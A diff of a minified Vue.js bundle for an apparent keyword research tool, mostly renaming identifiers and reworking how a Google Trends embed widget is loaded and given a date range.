                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
@@ -17528,7 +17539,7 @@ const uL = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -17537,7 +17548,7 @@ const uL = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", eL, [S("div", tL, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", e$, [S("div", t$, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -17546,7 +17557,7 @@ const uL = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", rL, [S("div", sL, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", r$, [S("div", s$, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -17560,14 +17571,14 @@ const uL = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, aL)])),
+                    }, null, 8, a$)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, oL)])),
+                    }, null, 8, o$)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -17592,7 +17603,7 @@ const uL = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", iL, [S("div", nL, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", i$, [S("div", n$, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -17600,18 +17611,18 @@ const uL = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 6 != e.current_tab ? T("", !0) : (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), !o.show_upsell || 1 != e.current_tab && 6 != e.current_tab ? T("", !0) : (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"]))])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", lL, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", l$, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -17648,7 +17659,7 @@ const uL = Ue({
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [6 == e.current_tab ? (b(), g("h4", cL, v(e.trans.get("Sorry, eBay does not provide any prepositions for your query")), 1)) : (b(), g("h4", _L, v(e.trans.get("Sorry, eBay does not provide any keyword suggestions for your query")), 1))])),
+                message: C((() => [6 == e.current_tab ? (b(), g("h4", c$, v(e.trans.get("Sorry, eBay does not provide any prepositions for your query")), 1)) : (b(), g("h4", _$, v(e.trans.get("Sorry, eBay does not provide any keyword suggestions for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(Y, {
                 onMore: e.more,
@@ -17688,13 +17699,13 @@ const uL = Ue({
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    dL = {
+    d$ = {
         class: "row g-0 me-lg-n1px"
     },
-    mL = {
+    m$ = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const hL = Ue({
+const h$ = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -17707,7 +17718,7 @@ const hL = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", dL, [S("div", mL, [E(i, {
+            return b(), g("div", d$, [S("div", m$, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -17732,17 +17743,17 @@ const hL = Ue({
             ])])])
         }]
     ]),
-    pL = {
+    p$ = {
         class: "row g-0 me-lg-n1px"
     },
-    gL = {
+    g$ = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    yL = {
+    y$ = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const wL = Ue({
-        mixins: [DT],
+const w$ = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/ebay/languages",
@@ -17760,7 +17771,7 @@ const wL = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", pL, [S("div", gL, [E(i, {
+            return b(), g("div", p$, [S("div", g$, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -17776,7 +17787,7 @@ const wL = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", yL, [E(i, {
+            ])]), S("div", y$, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -17789,35 +17800,35 @@ const wL = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    fL = ["value"],
-    bL = ["value"],
-    vL = {
+    f$ = ["value"],
+    b$ = ["value"],
+    v$ = {
         key: 2,
         class: "row"
     },
-    kL = {
+    k$ = {
         class: "col-12"
     },
-    xL = {
+    x$ = {
         class: "check-search-volume-settings-country mb-3"
     },
-    CL = {
+    C$ = {
         class: "form-label check-search-volume-settings-country-label"
     },
-    SL = {
+    S$ = {
         key: 3,
         class: "row"
     },
-    TL = {
+    T$ = {
         class: "col-12"
     },
-    FL = {
+    F$ = {
         class: "check-search-volume-settings-currency mb-3"
     },
-    qL = {
+    q$ = {
         class: "form-label check-search-volume-settings-currency-label"
     };
-const EL = Ue({
+const E$ = Ue({
     mixins: [IT]
 }, [
     ["render", function(e, t, r, s, a, o) {
@@ -17827,12 +17838,12 @@ const EL = Ue({
             name: "metrics_country",
             type: "hidden",
             value: e.country
-        }, null, 8, fL)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+        }, null, 8, f$)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
             key: 1,
             name: "metrics_currency",
             type: "hidden",
             value: e.currency
-        }, null, 8, bL)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", vL, [S("div", kL, [S("div", xL, [S("label", CL, v(e.trans.get("Country")), 1), E(i, {
+        }, null, 8, b$)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", v$, [S("div", k$, [S("div", x$, [S("label", C$, v(e.trans.get("Country")), 1), E(i, {
             options: e.current_country_list,
             settings: e.country_settings,
             class: "check-search-volume-settings-country-value",
@@ -17840,7 +17851,7 @@ const EL = Ue({
             "onUpdate:modelValue": t[0] || (t[0] = t => e.current_metrics_country = t),
             "model-value": e.current_metrics_country,
             placeholder: e.trans.get("Type a country")
-        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", SL, [S("div", TL, [S("div", FL, [S("label", qL, v(e.trans.get("Currency")), 1), E(i, {
+        }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0), e.current_currency_list.length && e.permissions.show_currency_settings ? (b(), g("div", S$, [S("div", T$, [S("div", F$, [S("label", q$, v(e.trans.get("Currency")), 1), E(i, {
             options: e.current_currency_list,
             settings: e.currency_settings,
             class: "check-search-volume-settings-currency-value",
@@ -17851,7 +17862,7 @@ const EL = Ue({
         }, null, 8, ["options", "settings", "model-value", "placeholder"])])])])) : T("", !0)])
     }]
 ]);
-const UL = Ue({
+const U$ = Ue({
         mixins: [_p],
         components: {},
         props: ["preoptions"],
@@ -17880,19 +17891,24 @@ const UL = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value"])
         }]
     ]),
-    ML = {
+    M$ = {
         async mounted() {
-            await new Promise((async (e, t) => {
-                var r = document.createElement("div");
-                r.classList.add("d-none"), r.setAttribute("id", "chart_embedinit"), r.setAttribute("style", "display:none"), document.body.appendChild(r);
-                var s = document.createElement("script");
-                s.async = !0, s.onload = () => {
-                    e(!0)
-                }, s.src = "https://ssl.gstatic.com/trends_nrtr/760_RC08/embed_loader.js", document.body.appendChild(s)
+            this.$nextTick((() => {
+                this.load()
             }))
         },
         methods: {
-            inittrends() {
+            async load() {
+                await new Promise((async (e, t) => {
+                    var r = document.createElement("div");
+                    r.classList.add("d-none"), r.setAttribute("id", "chart_embedinit"), r.setAttribute("style", "display:none"), document.body.appendChild(r);
+                    var s = document.createElement("script");
+                    s.async = !0, s.onload = () => {
+                        e(!0)
+                    }, s.src = "https://ssl.gstatic.com/trends_nrtr/3570_RC01/embed_loader.js", document.body.appendChild(s)
+                }))
+            },
+            initTrends() {
                 this.$nextTick((() => {
                     var e = document.getElementById("google-trends-carousel");
                     e && (e.addEventListener("slide.bs.carousel", (e => {
@@ -17902,151 +17918,154 @@ const UL = Ue({
                     }))
                 }))
             },
-            embedTrends(e, t, r = "") {
-                if ("undefined" != typeof trends) {
-                    var s = document.getElementById(e);
-                    if (s) null == s.getElementsByTagName("iframe")[0] && trends.embed.renderExploreWidgetTo(s, t, {
+            async embedTrends(e, t, r = "") {
+                if ("undefined" == typeof trends && await this.initTrends(), "undefined" != typeof trends) {
+                    var s = this.geo,
+                        a = this.property,
+                        o = this.date ? this.date : "today 12-m",
+                        i = document.getElementById(e);
+                    if (i) null == i.getElementsByTagName("iframe")[0] && trends.embed.renderExploreWidgetTo(i, t, {
                         comparisonItem: [{
                             keyword: r,
-                            geo: this.geo,
-                            time: "today 12-m"
+                            geo: s,
+                            time: o
                         }],
                         category: 0,
-                        property: this.property
+                        property: a
                     }, {
-                        exploreQuery: "cat=0&geo=" + this.geo + "&gprop=" + this.property + "&q=" + encodeURIComponent(r) + "&date=today 12-m",
+                        exploreQuery: "cat=0&geo=" + s + "&gprop=" + a + "&q=" + encodeURIComponent(r) + "&date=" + encodeURIComponent(o),
                         guestPath: "https://trends.google.com:443/trends/embed/"
                     })
                 }
             }
         }
     },
-    AL = {
+    A$ = {
         class: "search-results-settings my-2"
     },
-    PL = {
+    P$ = {
         class: "search-results-settings-display mx-n1"
     },
-    LL = {
+    $$ = {
         class: "row"
     },
-    BL = {
+    L$ = {
         class: "col"
     },
-    $L = {
+    D$ = {
         class: "search-results-settings-modal-header mb-3 pb-1 border-bottom"
     },
-    DL = {
+    j$ = {
         class: "row"
     },
-    OL = {
+    O$ = {
         key: 0,
         class: "col-12 col-md-6"
     },
-    jL = {
+    W$ = {
         key: 1,
         class: "col-12 col-md-6"
     },
-    VL = {
+    V$ = {
         class: "row"
     },
-    HL = {
+    H$ = {
         class: "col"
     },
-    IL = {
+    I$ = {
         class: "search-results-settings-modal-header my-3 pb-1 border-bottom"
     },
-    NL = {
+    N$ = {
         key: 0,
         class: "row"
     },
-    RL = {
+    B$ = {
         class: "col-12 col-md-6"
     },
-    KL = {
+    R$ = {
         class: "col-12 col-md-6"
     },
-    JL = {
+    K$ = {
         key: 1,
         class: "row"
     },
-    WL = {
+    J$ = {
         class: "col-12 col-md-6"
     },
-    zL = {
+    z$ = {
         key: 0,
         class: "search-results-settings-modal-low-top-page-bid mb-3"
     },
-    YL = {
+    Y$ = {
         class: "form-label search-results-settings-modal-low-top-page-bid-label"
     },
-    GL = {
+    G$ = {
         class: "search-results-settings-modal-low-top-page-bid-value input-group"
     },
-    XL = {
+    X$ = {
         class: "input-group-text rounded-0 border-start-0 border-end-0"
     },
-    QL = {
+    Q$ = {
         class: "col-12 col-md-6"
     },
-    ZL = {
+    Z$ = {
         key: 0,
         class: "search-results-settings-modal-high-top-page-bid mb-3"
     },
-    eB = {
+    eL = {
         class: "form-label search-results-settings-modal-high-top-page-bid-label"
     },
-    tB = {
+    tL = {
         class: "search-results-settings-modal-high-top-page-bid-value input-group"
     },
-    rB = {
+    rL = {
         class: "input-group-text rounded-0 border-start-0 border-end-0"
     },
-    sB = {
+    sL = {
         class: "row"
     },
-    aB = {
+    aL = {
         class: "col-12"
     },
-    oB = {
+    oL = {
         class: "row"
     },
-    iB = {
+    iL = {
         class: "col-12"
     },
-    nB = ["innerHTML"],
-    lB = ["innerHTML"],
-    cB = {
+    nL = ["innerHTML"],
+    lL = ["innerHTML"],
+    cL = {
         class: "search-results-summary card my-4 bg-light"
     },
-    _B = {
+    _L = {
         key: 0,
         class: "card-body"
     },
-    uB = {
+    uL = {
         class: "search-results-keywords my-3"
     },
-    dB = {
+    dL = {
         key: 0,
         class: "mb-4"
     },
-    mB = {
+    mL = {
         key: 1,
         class: "mb-4"
     },
-    hB = {
+    hL = {
         key: 2,
         class: "mb-4"
     },
-    pB = {
+    pL = {
         key: 3,
         class: "mb-4"
     };
-const gB = Ue({
-        mixins: [mp, ML],
+const gL = Ue({
+        mixins: [mp, M$],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         data: () => ({
             show_google_trends_chart: !0
@@ -18139,7 +18158,7 @@ const gB = Ue({
                         payload: this.sanitizePayload(JSON.stringify(t))
                     }, {
                         headers: l
-                    }), this.has_all_error = n.data.has_all_error, this.has_error = n.data.has_error, this.keywords = n.data.keywords, this.has_keywords = !!this.keywords && this.keywords.length > 0, this.breakdown_url = n.data.breakdown_url ? n.data.breakdown_url : null, this.device_breakdown_url = n.data.device_breakdown_url ? n.data.device_breakdown_url : null, this.keywords_payload = n.data.keywords_payload, this.metrics_url = n.data.metrics_url, this.current_scrape_urls = n.data.scrape_urls, await this.metrics(!0), this.inittrends()
+                    }), this.has_all_error = n.data.has_all_error, this.has_error = n.data.has_error, this.keywords = n.data.keywords, this.has_keywords = !!this.keywords && this.keywords.length > 0, this.breakdown_url = n.data.breakdown_url ? n.data.breakdown_url : null, this.device_breakdown_url = n.data.device_breakdown_url ? n.data.device_breakdown_url : null, this.keywords_payload = n.data.keywords_payload, this.metrics_url = n.data.metrics_url, this.current_scrape_urls = n.data.scrape_urls, await this.metrics(!0), this.initTrends()
                 } catch (c) {
                     this.loading = !1, this.has_all_error = !0, this.has_error = !0
                 }
@@ -18166,18 +18185,18 @@ const gB = Ue({
                 M = k("search-results-settings-modal-search-network"),
                 A = k("search-results-settings-modal-currency"),
                 P = k("search-results-settings-modal-search-volume"),
-                $ = k("search-results-settings-modal-search-volume-trend"),
-                D = k("search-results-settings-modal-average-cpc"),
+                D = k("search-results-settings-modal-search-volume-trend"),
+                j = k("search-results-settings-modal-average-cpc"),
                 O = k("search-results-settings-modal-bing-competition"),
-                j = k("search-results-settings-modal-competition"),
+                W = k("search-results-settings-modal-competition"),
                 V = k("search-results-settings-filter-positive-keywords"),
                 H = k("search-results-settings-filter-negative-keywords"),
                 I = k("alert-pro-upsell"),
                 N = k("search-results-settings-admin-settings"),
-                R = k("search-results-settings-modal"),
-                K = k("search-results-tabs"),
-                J = k("has-error"),
-                W = k("suggest-page-reload"),
+                B = k("search-results-settings-modal"),
+                R = k("search-results-tabs"),
+                K = k("has-error"),
+                J = k("suggest-page-reload"),
                 z = k("google-search-volume-summary"),
                 Y = k("show-upsell"),
                 G = k("google-search-volume-result"),
@@ -18192,10 +18211,10 @@ const gB = Ue({
                 oe = k("dropdown-menu-item-copy-keywords-search-volume"),
                 ie = k("dropdown-menu-item-copy-keywords-all-data"),
                 ne = k("search-results-actions"),
-                le = L("mask");
+                le = $("mask");
             return b(), g("div", null, [E(i, {
                 loading: e.loading
-            }, null, 8, ["loading"]), S("div", AL, [S("div", PL, [E(n, {
+            }, null, 8, ["loading"]), S("div", A$, [S("div", P$, [E(n, {
                 onClearFilter: e.clearFilter,
                 current_permissions: e.current_permissions,
                 show_current_filter_keyword_result_period: e.show_current_filter_keyword_result_period,
@@ -18248,7 +18267,7 @@ const gB = Ue({
                 show_current_split_negative_keywords: e.show_current_split_negative_keywords,
                 show_display_filter_negative_keywords: e.show_display_filter_negative_keywords,
                 onClearFilter: e.clearFilter
-            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E(R, {
+            }, null, 8, ["show_current_split_negative_keywords", "show_display_filter_negative_keywords", "onClearFilter"])]), E(B, {
                 onResetFilter: e.resetFilter,
                 onApplyFilter: e.applyFilter,
                 filter_counter: e.filter_counter,
@@ -18257,19 +18276,19 @@ const gB = Ue({
             }, {
                 content: C((() => [e.current_permissions.show_search_volume_data && (e.current_permissions.show_currency_settings || e.current_permissions.show_search_network_settings) ? (b(), g(y, {
                     key: 0
-                }, [S("div", LL, [S("div", BL, [S("h5", $L, v(e.trans.get("Search Volume Settings")), 1)])]), S("div", DL, [e.current_permissions.show_search_network_settings ? (b(), g("div", OL, [E(M, {
+                }, [S("div", $$, [S("div", L$, [S("h5", D$, v(e.trans.get("Search Volume Settings")), 1)])]), S("div", j$, [e.current_permissions.show_search_network_settings ? (b(), g("div", O$, [E(M, {
                     current_network_list: e.current_network_list,
                     current_metrics_network: e.current_metrics_network,
                     "onUpdate:current_metrics_network": t[0] || (t[0] = t => e.current_metrics_network = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])) : T("", !0), e.current_permissions.show_currency_settings ? (b(), g("div", jL, [E(A, {
+                }, null, 8, ["current_network_list", "current_metrics_network", "disabled"])])) : T("", !0), e.current_permissions.show_currency_settings ? (b(), g("div", W$, [E(A, {
                     current_currency_list: e.current_currency_list,
                     current_metrics_currency: e.current_metrics_currency,
                     "onUpdate:current_metrics_currency": t[1] || (t[1] = t => e.current_metrics_currency = t),
                     disabled: 4 == e.current_tab
-                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)])], 64)) : T("", !0), S("div", VL, [S("div", HL, [S("h5", IL, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data || e.current_permissions.show_low_top_page_bid_data || e.current_permissions.show_high_top_page_bid_data ? (b(), g(y, {
+                }, null, 8, ["current_currency_list", "current_metrics_currency", "disabled"])])) : T("", !0)])], 64)) : T("", !0), S("div", V$, [S("div", H$, [S("h5", I$, v(e.trans.get("Filter Results")), 1)])]), e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data || e.current_permissions.show_low_top_page_bid_data || e.current_permissions.show_high_top_page_bid_data ? (b(), g(y, {
                     key: 1
-                }, [e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", NL, [S("div", RL, [E(P, {
+                }, [e.current_permissions.show_search_volume_data || e.current_permissions.show_cpc_data || e.current_permissions.show_competition_data ? (b(), g("div", N$, [S("div", B$, [E(P, {
                     current_permissions: e.current_permissions,
                     search_volume_format: e.search_volume_format,
                     error_fields: e.error_fields,
@@ -18277,7 +18296,7 @@ const gB = Ue({
                     "onUpdate:current_filter_search_volume_min": t[2] || (t[2] = t => e.current_filter_search_volume_min = t),
                     current_filter_search_volume_max: e.current_filter_search_volume_max,
                     "onUpdate:current_filter_search_volume_max": t[3] || (t[3] = t => e.current_filter_search_volume_max = t)
-                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E($, {
+                }, null, 8, ["current_permissions", "search_volume_format", "error_fields", "current_filter_search_volume_min", "current_filter_search_volume_max"]), E(D, {
                     current_permissions: e.current_permissions,
                     search_volume_trend_format: e.search_volume_trend_format,
                     error_fields: e.error_fields,
@@ -18285,7 +18304,7 @@ const gB = Ue({
                     "onUpdate:current_filter_search_volume_trend_min": t[4] || (t[4] = t => e.current_filter_search_volume_trend_min = t),
                     current_filter_search_volume_trend_max: e.current_filter_search_volume_trend_max,
                     "onUpdate:current_filter_search_volume_trend_max": t[5] || (t[5] = t => e.current_filter_search_volume_trend_max = t)
-                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", KL, [E(D, {
+                }, null, 8, ["current_permissions", "search_volume_trend_format", "error_fields", "current_filter_search_volume_trend_min", "current_filter_search_volume_trend_max"])]), S("div", R$, [E(j, {
                     current_permissions: e.current_permissions,
                     average_cpc_format: e.average_cpc_format,
                     error_fields: e.error_fields,
@@ -18298,7 +18317,7 @@ const gB = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(j, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(W, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -18307,7 +18326,7 @@ const gB = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), e.current_permissions.show_low_top_page_bid_data || e.current_permissions.show_high_top_page_bid_data ? (b(), g("div", JL, [S("div", WL, [e.current_permissions.show_low_top_page_bid_data ? (b(), g("div", zL, [S("label", YL, v(e.trans.get("Top of Page Bid (Low Range)")), 1), S("div", GL, [F(S("input", {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), e.current_permissions.show_low_top_page_bid_data || e.current_permissions.show_high_top_page_bid_data ? (b(), g("div", K$, [S("div", J$, [e.current_permissions.show_low_top_page_bid_data ? (b(), g("div", z$, [S("label", Y$, v(e.trans.get("Top of Page Bid (Low Range)")), 1), S("div", G$, [F(S("input", {
                     placeholder: "min",
                     type: "text",
                     class: f(["form-control", {
@@ -18318,7 +18337,7 @@ const gB = Ue({
                 }, null, 2), [
                     [le, e.low_top_page_bid_format],
                     [U, e.current_filter_low_top_page_bid_min]
-                ]), S("span", XL, v(e.trans.get("to")), 1), F(S("input", {
+                ]), S("span", X$, v(e.trans.get("to")), 1), F(S("input", {
                     placeholder: "max",
                     type: "text",
                     class: f(["form-control", {
@@ -18329,7 +18348,7 @@ const gB = Ue({
                 }, null, 2), [
                     [le, e.low_top_page_bid_format],
                     [U, e.current_filter_low_top_page_bid_max]
-                ])])])) : T("", !0)]), S("div", QL, [e.current_permissions.show_high_top_page_bid_data ? (b(), g("div", ZL, [S("label", eB, v(e.trans.get("Top of Page Bid (High Range)")), 1), S("div", tB, [F(S("input", {
+                ])])])) : T("", !0)]), S("div", Q$, [e.current_permissions.show_high_top_page_bid_data ? (b(), g("div", Z$, [S("label", eL, v(e.trans.get("Top of Page Bid (High Range)")), 1), S("div", tL, [F(S("input", {
                     placeholder: "min",
                     type: "text",
                     class: f(["form-control", {
@@ -18340,7 +18359,7 @@ const gB = Ue({
                 }, null, 2), [
                     [le, e.high_top_page_bid_format],
                     [U, e.current_filter_high_top_page_bid_min]
-                ]), S("span", rB, v(e.trans.get("to")), 1), F(S("input", {
+                ]), S("span", rL, v(e.trans.get("to")), 1), F(S("input", {
                     placeholder: "max",
                     type: "text",
                     class: f(["form-control", {
@@ -18351,7 +18370,7 @@ const gB = Ue({
                 }, null, 2), [
                     [le, e.high_top_page_bid_format],
                     [U, e.current_filter_high_top_page_bid_max]
-                ])])])) : T("", !0)])])) : T("", !0)], 64)) : T("", !0), S("div", sB, [S("div", aB, [E(V, {
+                ])])])) : T("", !0)])])) : T("", !0)], 64)) : T("", !0), S("div", sL, [S("div", aL, [E(V, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -18360,7 +18379,7 @@ const gB = Ue({
                     "onUpdate:current_filter_keywords": t[15] || (t[15] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[16] || (t[16] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", oB, [S("div", iB, [E(H, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", oL, [S("div", iL, [E(H, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -18374,12 +18393,12 @@ const gB = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, nB)])),
+                    }, null, 8, nL)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, lB)])),
+                    }, null, 8, lL)])),
                     _: 1
                 }, 8, ["current_permissions", "routes"]), E(N, {
                     current_permissions: e.current_permissions,
@@ -18393,20 +18412,20 @@ const gB = Ue({
                     reset_all_metrics_url: e.current_reset_all_metrics_url
                 }, null, 8, ["current_permissions", "current_filter_keyword_result_period", "current_keyword_result_periods", "search_engine", "current_tab", "reset_keywords_url", "reset_latest_metrics_url", "reset_all_metrics_url"])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(K, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(R, {
                 onApplyTab: o.applyTab,
                 tabs: e.tabs,
                 current_tab: e.current_tab,
                 loading: e.loading
-            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(J, {
+            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(K, {
                 key: 0,
                 user_is_paid: e.user_is_paid,
                 has_metrics: e.has_metrics,
                 onFetch: o.fetch,
                 current_tab: e.current_tab
-            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(W, {
+            }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(J, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", cB, [e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide ? (b(), g("div", _B, [E(z, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", cL, [e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide ? (b(), g("div", _L, [E(z, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 show_google_trends_chart: a.show_google_trends_chart,
@@ -18422,8 +18441,8 @@ const gB = Ue({
                 selected_language_name: e.selected_language_name,
                 search_engine: e.search_engine
             }, null, 8, ["routes", "selected_language_name", "search_engine"]))])) : T("", !0)], 512), [
